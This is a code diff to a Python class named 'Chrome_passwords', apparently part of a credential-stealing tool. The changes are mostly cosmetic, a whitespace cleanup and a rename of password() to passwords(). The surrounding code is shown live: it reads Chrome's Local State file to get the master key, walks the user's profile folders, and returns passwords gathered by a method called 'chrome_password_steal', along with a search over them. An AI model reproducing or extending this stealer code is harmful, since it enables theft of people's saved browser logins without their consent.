@@ -32,11 +32,8 @@ class Chrome_passwords():
             except Exception:
                 pass
 
-  
-
         def get_chrome_datetime(chromedate):
             return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
-
 
         def get_master_key():
             with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r" ,encoding='iso-8859-1') as f:
@@ -64,8 +61,7 @@ class Chrome_passwords():
             except Exception as e:
                 return "Chrome < 80"
 
-
-        def password():
+        def passwords():
             main_loc = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data'+os.sep
             possible_location = ["Default",'Guest profile']
             for folder in os.listdir(main_loc):
@@ -220,17 +216,12 @@ class Chrome_passwords():
                     resault.append(str(for_file[i][3:]).encode())
                     resault.append(data.encode())
                 data=''
-                    
-        
             return resault
-                
         
         temp()
         createPath()       
-        return password()
-        
+        return passwords()
 
-            
     def advanced_search(self,val):
         passwords=self.chrome_password_steal()
         name=passwords[::2]
@@ -256,7 +247,6 @@ class Chrome_passwords():
                         if ('-'*10)not in C:
                             sevdvar+=A+'\r\n'+B+'\r\n'+C+'\r\n'+D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'
                             c=1
-
                         else:
                             sevdvar+=A+'\r\n'+B+'\r\n'+D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'
                         
@@ -269,14 +259,8 @@ class Chrome_passwords():
                     c=1
             res.append(sevdvar)
             sevdvar=''
-                                          
+                           
         if t<1:
             return["'"+val+"'"+" is not found.."]
         return res
-
-
-
-
-
-
 
